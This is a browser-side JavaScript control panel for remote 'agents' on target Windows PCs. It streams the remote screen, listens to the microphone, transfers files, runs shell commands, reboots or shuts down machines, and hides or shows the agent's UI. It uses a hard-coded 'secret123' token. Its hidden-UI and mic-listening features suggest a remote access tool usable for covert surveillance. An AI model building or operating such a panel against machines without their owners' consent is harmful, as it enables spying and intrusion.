// Application State
const state = {
    socket: null,
    token: 'secret123',
    connected: false,
    streaming: false,
    listeningAudio: false,
    currentPath: 'C:\\',
    screenWidth: 1920,
    screenHeight: 1080,
    fpsLastTime: performance.now(),
    fpsCount: 0
};

// Web Audio API Context
let audioCtx = null;
let nextAudioStartTime = 0;

// Initialize Elements
const elements = {
    tabButtons: document.querySelectorAll('.nav-item'),
    tabPanes: document.querySelectorAll('.tab-pane'),
    tabTitle: document.getElementById('tab-title'),
    agentStatus: document.getElementById('agent-status'),
    reconnectBtn: document.getElementById('reconnect-btn'),
    
    // Overview Metrics
    metricsStatus: document.getElementById('metrics-status'),
    metricsRelay: document.getElementById('metrics-relay'),
    metricsPing: document.getElementById('metrics-ping'),
    
    // Overview Quick Actions
    actionShutdown: document.getElementById('action-shutdown'),
    actionReboot: document.getElementById('action-reboot'),
    actionShowUI: document.getElementById('action-showui'),
    actionHideUI: document.getElementById('action-hideui'),
    
    // Screen Share
    toggleStream: document.getElementById('toggle-stream'),
    toggleAudio: document.getElementById('toggle-audio'),
    screenView: document.getElementById('screen-view'),
    screenPlaceholder: document.getElementById('screen-placeholder'),
    fpsCounter: document.getElementById('fps-counter'),
    
    // File Explorer
    fileCurrentPath: document.getElementById('file-current-path'),
    fileGoBtn: document.getElementById('file-go-btn'),
    fileUpBtn: document.getElementById('file-up-btn'),
    fileListBody: document.getElementById('file-list-body'),
    fileUploadInput: document.getElementById('file-upload-input'),
    
    // Terminal
    terminalBody: document.getElementById('terminal-body'),
    terminalInput: document.getElementById('terminal-input'),
    terminalSend: document.getElementById('terminal-send'),
    clearTerminal: document.getElementById('clear-terminal'),
    
    // Settings
    settingsToken: document.getElementById('settings-token'),
    settingsSave: document.getElementById('settings-save'),
    
    // Target Selector
    targetAgentSelect: document.getElementById('target-agent-select')
};

// ---------------- TAB NAVIGATION ----------------
elements.tabButtons.forEach(btn => {
    btn.addEventListener('click', () => {
        const tabName = btn.dataset.tab;
        
        // Toggle Active Buttons
        elements.tabButtons.forEach(b => b.classList.remove('active'));
        btn.classList.add('active');
        
        // Toggle Active Panes
        elements.tabPanes.forEach(pane => pane.classList.remove('active'));
        const activePane = document.getElementById(`tab-${tabName}`);
        activePane.classList.add('active');
        
        // Update Title
        elements.tabTitle.textContent = btn.querySelector('span').textContent;

        // Auto request file listing if opening file manager
        if (tabName === 'file-manager' && state.connected) {
            requestFileList(state.currentPath);
        }
    });
});

// Target Agent Dropdown Selection Listener
elements.targetAgentSelect.addEventListener('change', () => {
    const selectedAgentId = elements.targetAgentSelect.value;
    
    // Stop any existing stream
    stopDesktopStream();
    stopAudioStream();
    
    if (selectedAgentId) {
        logTerminal(`[System] Selecting target: ${selectedAgentId}...`, 'system');
        sendToServer({ action: 'select_agent', targetId: selectedAgentId });
    } else {
        sendToServer({ action: 'select_agent', targetId: null });
        setAgentOffline();
    }
});

// ---------------- WEBSOCKET CONNECTION ----------------
function connectWebSocket() {
    if (state.socket) {
        state.socket.close();
    }
    
    elements.metricsRelay.textContent = 'Connecting...';
    elements.metricsRelay.className = 'value text-warning';
    
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}?type=dashboard&token=${state.token}`;
    
    const socket = new WebSocket(wsUrl);
    socket.binaryType = 'arraybuffer';
    state.socket = socket;
    
    socket.onopen = () => {
        console.log('Connected to relay server.');
        elements.metricsRelay.textContent = 'Connected';
        elements.metricsRelay.className = 'value online-text';
    };
    
    socket.onmessage = (event) => {
        if (event.data instanceof ArrayBuffer) {
            handleBinaryMessage(event.data);
        } else {
            handleTextMessage(event.data);
        }
    };
    
    socket.onclose = (event) => {
        console.log('WebSocket closed:', event.reason);
        elements.metricsRelay.textContent = 'Disconnected';
        elements.metricsRelay.className = 'value offline-text';
        setAgentOffline();
    };
    
    socket.onerror = (err) => {
        console.error('WebSocket Error:', err);
    };
}

// ---------------- MESSAGE HANDLERS ----------------
function handleTextMessage(data) {
    try {
        const msg = JSON.parse(data);
        
        if (msg.type === 'status') {
            if (msg.connected) {
                setAgentOnline(msg);
            } else {
                setAgentOffline();
            }
        } else if (msg.type === 'agent_list') {
            updateAgentList(msg.agents);
        } else if (msg.type === 'cmd_response') {
            logTerminal(msg.output, msg.success ? 'cmd-out' : 'err');
        } else if (msg.type === 'log') {
            logTerminal(msg.message, 'system');
        } else if (msg.type === 'file_list') {
            renderFiles(msg);
        } else if (msg.type === 'file_download') {
            triggerFileDownload(msg);
        } else if (msg.type === 'file_upload_status') {
            logTerminal(msg.message, msg.success ? 'system' : 'err');
            requestFileList(state.currentPath);
        } else if (msg.type === 'ping') {
            // Echo ping back to calculate latency
            sendToServer({ type: 'pong_response', sentAt: msg.sentAt });
        } else if (msg.type === 'pong_response') {
            const latency = Date.now() - msg.sentAt;
            elements.metricsPing.textContent = `${latency || 0} ms`;
        }
    } catch (e) {
        logTerminal(data, 'cmd-out');
    }
}

function handleBinaryMessage(buffer) {
    const view = new DataView(buffer);
    const type = view.getUint8(0);
    
    if (type === 0x01) {
        // Screenshot
        const blob = new Blob([buffer.slice(1)], { type: 'image/jpeg' });
        const url = URL.createObjectURL(blob);
        
        const oldUrl = elements.screenView.src;
        elements.screenView.src = url;
        if (oldUrl.startsWith('blob:')) {
            URL.revokeObjectURL(oldUrl);
        }
        
        // FPS Counter
        state.fpsCount++;
        const now = performance.now();
        if (now - state.fpsLastTime >= 1000) {
            elements.fpsCounter.textContent = `FPS: ${state.fpsCount}`;
            state.fpsCount = 0;
            state.fpsLastTime = now;
        }
    } else if (type === 0x02 && state.listeningAudio) {
        // Audio stream
        playPCM(buffer);
    }
}

function sendToServer(obj) {
    if (state.socket && state.socket.readyState === WebSocket.OPEN) {
        state.socket.send(JSON.stringify(obj));
    }
}

// ---------------- AUDIO PLAYER ----------------
function initAudio() {
    if (!audioCtx) {
        audioCtx = new (window.AudioContext || window.webkitAudioContext)();
        nextAudioStartTime = audioCtx.currentTime;
    }
    if (audioCtx.state === 'suspended') {
        audioCtx.resume();
    }
}

function playPCM(buffer) {
    if (!audioCtx) return;
    
    // Skip 1 byte header
    const int16 = new Int16Array(buffer, 1);
    const float32 = new Float32Array(int16.length);
    
    // Convert 16-bit signed PCM to 32-bit float [-1.0, 1.0]
    for (let i = 0; i < int16.length; i++) {
        float32[i] = int16[i] / 32768.0;
    }
    
    const audioBuffer = audioCtx.createBuffer(1, float32.length, 16000); // 16kHz
    audioBuffer.copyToChannel(float32, 0);
    
    const source = audioCtx.createBufferSource();
    source.buffer = audioBuffer;
    source.connect(audioCtx.destination);
    
    const currentTime = audioCtx.currentTime;
    if (nextAudioStartTime < currentTime) {
        nextAudioStartTime = currentTime;
    }
    source.start(nextAudioStartTime);
    nextAudioStartTime += audioBuffer.duration;
}

// ---------------- UI STATE SETTERS ----------------
function setAgentOnline(msg) {
    state.connected = true;
    
    elements.agentStatus.className = 'status-badge online';
    elements.agentStatus.querySelector('.status-text').textContent = 'ONLINE';
    
    elements.metricsStatus.textContent = 'Active';
    elements.metricsStatus.className = 'value online-text';
    
    if (msg.screenWidth) state.screenWidth = msg.screenWidth;
    if (msg.screenHeight) state.screenHeight = msg.screenHeight;

    logTerminal(`[System] Controlling: ${msg.targetId || elements.targetAgentSelect.value}`, 'system');
    
    // Fetch file list if currently in file manager
    if (document.querySelector('.nav-item[data-tab="file-manager"]').classList.contains('active')) {
        requestFileList(state.currentPath);
    }
}

function setAgentOffline() {
    state.connected = false;
    
    elements.agentStatus.className = 'status-badge offline';
    elements.agentStatus.querySelector('.status-text').textContent = 'OFFLINE';
    
    elements.metricsStatus.textContent = 'Disconnected';
    elements.metricsStatus.className = 'value offline-text';
    elements.metricsPing.textContent = '-- ms';
    
    // Stop stream
    stopDesktopStream();
    stopAudioStream();
    
    logTerminal('[System] Remote Agent disconnected.', 'system');
}

// ---------------- SCREEN SHARE CONTROLS ----------------
elements.toggleStream.addEventListener('click', () => {
    if (state.streaming) {
        stopDesktopStream();
    } else {
        startDesktopStream();
    }
});

function startDesktopStream() {
    if (!state.connected) return;
    state.streaming = true;
    elements.toggleStream.innerHTML = '<i class="fa-solid fa-stop"></i> Stop Stream';
    elements.toggleStream.className = 'btn btn-danger';
    elements.screenView.classList.remove('hidden');
    elements.screenPlaceholder.classList.add('hidden');
    
    // Request agent to start sending screenshots
    sendToServer({ action: 'screenshot_start' });
}

function stopDesktopStream() {
    state.streaming = false;
    elements.toggleStream.innerHTML = '<i class="fa-solid fa-play"></i> Start Stream';
    elements.toggleStream.className = 'btn btn-primary';
    elements.screenView.classList.add('hidden');
    elements.screenPlaceholder.classList.remove('hidden');
    elements.fpsCounter.textContent = 'FPS: 0';
    
    sendToServer({ action: 'screenshot_stop' });
}

// ---------------- AUDIO STREAM CONTROLS ----------------
elements.toggleAudio.addEventListener('click', () => {
    if (state.listeningAudio) {
        stopAudioStream();
    } else {
        startAudioStream();
    }
});

function startAudioStream() {
    if (!state.connected) return;
    initAudio();
    state.listeningAudio = true;
    elements.toggleAudio.innerHTML = '<i class="fa-solid fa-volume-high"></i> Stop Listen';
    elements.toggleAudio.className = 'btn btn-danger';
    
    sendToServer({ action: 'audio_start' });
}

function stopAudioStream() {
    state.listeningAudio = false;
    elements.toggleAudio.innerHTML = '<i class="fa-solid fa-volume-xmark"></i> Listen Mic';
    elements.toggleAudio.className = 'btn btn-secondary';
    
    sendToServer({ action: 'audio_stop' });
}

// ---------------- SCREEN INTERACTIONS (MOUSE/KEYBOARD) ----------------
elements.screenView.addEventListener('click', (e) => {
    if (!state.connected || !state.streaming) return;
    
    // Calculate clicked coordinates scaled to remote display size
    const rect = elements.screenView.getBoundingClientRect();
    const xRatio = e.clientX - rect.left;
    const yRatio = e.clientY - rect.top;
    
    const clickX = Math.round((xRatio / rect.width) * state.screenWidth);
    const clickY = Math.round((yRatio / rect.height) * state.screenHeight);
    
    // Send mouse move then click
    sendToServer({
        action: 'mousemove',
        x: clickX,
        y: clickY
    });
    
    // Determine click type
    const isRightClick = e.button === 2;
    sendToServer({
        action: 'mouseclick',
        button: isRightClick ? 'right' : 'left'
    });
});

// Disable right click menu on screen share
elements.screenView.addEventListener('contextmenu', (e) => {
    e.preventDefault();
});

// ---------------- FILE EXPLORER CONTROLS ----------------
function requestFileList(path) {
    state.currentPath = path;
    elements.fileCurrentPath.value = path;
    sendToServer({ action: 'fileaccess', sub: 'list', path: path });
}

elements.fileGoBtn.addEventListener('click', () => {
    requestFileList(elements.fileCurrentPath.value);
});

elements.fileCurrentPath.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        requestFileList(elements.fileCurrentPath.value);
    }
});

elements.fileUpBtn.addEventListener('click', () => {
    let path = state.currentPath;
    if (path.endsWith('\\')) {
        path = path.slice(0, -1);
    }
    const idx = path.lastIndexOf('\\');
    if (idx !== -1) {
        const parent = path.substring(0, idx + 1);
        requestFileList(parent);
    }
});

function renderFiles(msg) {
    elements.fileListBody.innerHTML = '';
    
    if (!msg.files || msg.files.length === 0) {
        elements.fileListBody.innerHTML = '<tr><td colspan="4" class="text-center">Empty directory or permission denied.</td></tr>';
        return;
    }
    
    msg.files.forEach(item => {
        const tr = document.createElement('tr');
        
        // Icon and Name
        const nameTd = document.createElement('td');
        nameTd.className = item.isDir ? 'file-row-dir' : 'file-row-file';
        const icon = item.isDir ? '<i class="fa-solid fa-folder"></i>' : '<i class="fa-solid fa-file"></i>';
        nameTd.innerHTML = `${icon} ${item.name}`;
        
        if (item.isDir) {
            nameTd.addEventListener('click', () => {
                let separator = state.currentPath.endsWith('\\') ? '' : '\\';
                requestFileList(state.currentPath + separator + item.name);
            });
        }
        
        // Type
        const typeTd = document.createElement('td');
        typeTd.textContent = item.isDir ? 'Folder' : 'File';
        
        // Size
        const sizeTd = document.createElement('td');
        sizeTd.textContent = item.isDir ? '--' : formatBytes(item.size);
        
        // Actions
        const actionsTd = document.createElement('td');
        actionsTd.className = 'text-right';
        if (!item.isDir) {
            const dlBtn = document.createElement('button');
            dlBtn.className = 'btn btn-icon';
            dlBtn.innerHTML = '<i class="fa-solid fa-download"></i>';
            dlBtn.style.width = '30px';
            dlBtn.style.height = '30px';
            dlBtn.title = 'Download';
            dlBtn.addEventListener('click', () => {
                let separator = state.currentPath.endsWith('\\') ? '' : '\\';
                sendToServer({
                    action: 'fileaccess',
                    sub: 'download',
                    path: state.currentPath + separator + item.name
                });
            });
            actionsTd.appendChild(dlBtn);
        }
        
        tr.appendChild(nameTd);
        tr.appendChild(typeTd);
        tr.appendChild(sizeTd);
        tr.appendChild(actionsTd);
        elements.fileListBody.appendChild(tr);
    });
}

function formatBytes(bytes) {
    if (bytes === 0) return '0 Bytes';
    const k = 1024;
    const sizes = ['Bytes', 'KB', 'MB', 'GB'];
    const i = Math.floor(Math.log(bytes) / Math.log(k));
    return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
}

// ---------------- FILE DOWNLOAD TRIGGER ----------------
function triggerFileDownload(msg) {
    try {
        const binStr = atob(msg.data);
        const len = binStr.length;
        const bytes = new Uint8Array(len);
        for (let i = 0; i < len; i++) {
            bytes[i] = binStr.charCodeAt(i);
        }
        const blob = new Blob([bytes], { type: 'application/octet-stream' });
        const link = document.createElement('a');
        link.href = URL.createObjectURL(blob);
        link.download = msg.name;
        document.body.appendChild(link);
        link.click();
        document.body.removeChild(link);
        URL.revokeObjectURL(link.href);
        logTerminal(`[System] Downloaded: ${msg.name}`, 'system');
    } catch (e) {
        console.error('File download failed:', e);
    }
}

// ---------------- FILE UPLOAD TRIGGER ----------------
elements.fileUploadInput.addEventListener('change', () => {
    if (!state.connected || elements.fileUploadInput.files.length === 0) return;
    
    const file = elements.fileUploadInput.files[0];
    const reader = new FileReader();
    
    reader.onload = function(e) {
        const raw = e.target.result;
        const b64 = btoa(new Uint8Array(raw).reduce((data, byte) => data + String.fromCharCode(byte), ''));
        
        let separator = state.currentPath.endsWith('\\') ? '' : '\\';
        const destPath = state.currentPath + separator + file.name;
        
        logTerminal(`[System] Uploading ${file.name}...`, 'system');
        sendToServer({
            action: 'fileaccess',
            sub: 'upload',
            path: destPath,
            data: b64
        });
        
        elements.fileUploadInput.value = ''; // Reset input
    };
    
    reader.readAsArrayBuffer(file);
});

// ---------------- TERMINAL CONSOLE ----------------
function logTerminal(text, type = 'cmd-out') {
    const line = document.createElement('div');
    line.className = `terminal-line ${type}`;
    
    if (type === 'cmd-in') {
        line.innerHTML = `<span class="terminal-prompt">&gt;</span> ${text}`;
    } else {
        line.textContent = text;
    }
    
    elements.terminalBody.appendChild(line);
    elements.terminalBody.scrollTop = elements.terminalBody.scrollHeight;
}

function sendTerminalCommand() {
    const cmd = elements.terminalInput.value.trim();
    if (!cmd) return;
    
    logTerminal(cmd, 'cmd-in');
    elements.terminalInput.value = '';
    
    if (!state.connected) {
        logTerminal('ERR: No agent connected.', 'err');
        return;
    }
    
    // Parse launch command vs shell execution
    if (cmd.toLowerCase().startsWith('launch ')) {
        const p = cmd.substring(7);
        sendToServer({ action: 'launch', command: p });
    } else if (cmd.toLowerCase() === 'shutdown') {
        sendToServer({ action: 'shutdown' });
    } else if (cmd.toLowerCase() === 'reboot') {
        sendToServer({ action: 'reboot' });
    } else {
        // Send as general command to launch process
        sendToServer({ action: 'launch', command: cmd });
    }
}

elements.terminalInput.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        sendTerminalCommand();
    }
});

elements.terminalSend.addEventListener('click', sendTerminalCommand);

elements.clearTerminal.addEventListener('click', () => {
    elements.terminalBody.innerHTML = '';
});

// ---------------- QUICK OPERATIONS ----------------
elements.actionShutdown.addEventListener('click', () => {
    if (confirm('Are you sure you want to shutdown the remote computer?')) {
        sendToServer({ action: 'shutdown' });
    }
});

elements.actionReboot.addEventListener('click', () => {
    if (confirm('Are you sure you want to reboot the remote computer?')) {
        sendToServer({ action: 'reboot' });
    }
});

elements.actionShowUI.addEventListener('click', () => {
    sendToServer({ action: 'showui' });
});

elements.actionHideUI.addEventListener('click', () => {
    sendToServer({ action: 'hideui' });
});

// ---------------- RECONNECT AND SETTINGS ----------------
elements.reconnectBtn.addEventListener('click', () => {
    connectWebSocket();
});

elements.settingsSave.addEventListener('click', () => {
    state.token = elements.settingsToken.value;
    alert('Settings saved. Reconnecting...');
    connectWebSocket();
});

// ---------------- HEARTBEAT / LATENCY CHECK ----------------
setInterval(() => {
    if (state.connected) {
        sendToServer({ type: 'ping', sentAt: Date.now() });
    }
}, 5000);

// Initialize Socket on load
connectWebSocket();

// Helper to update Target PC list in dropdown
function updateAgentList(agents) {
    const currentVal = elements.targetAgentSelect.value;
    
    // Clear select options (keep placeholder)
    elements.targetAgentSelect.innerHTML = '<option value="">No Active Target</option>';
    
    if (!agents || agents.length === 0) {
        elements.targetAgentSelect.disabled = true;
        setAgentOffline();
        return;
    }
    
    elements.targetAgentSelect.disabled = false;
    
    agents.forEach(agent => {
        const opt = document.createElement('option');
        opt.value = agent.id;
        opt.textContent = `${agent.hostname} (${agent.ip})`;
        elements.targetAgentSelect.appendChild(opt);
    });
    
    // Check if previously selected agent is still connected
    const stillOnline = agents.some(a => a.id === currentVal);
    if (stillOnline) {
        elements.targetAgentSelect.value = currentVal;
    } else {
        elements.targetAgentSelect.value = '';
        setAgentOffline();
    }
}
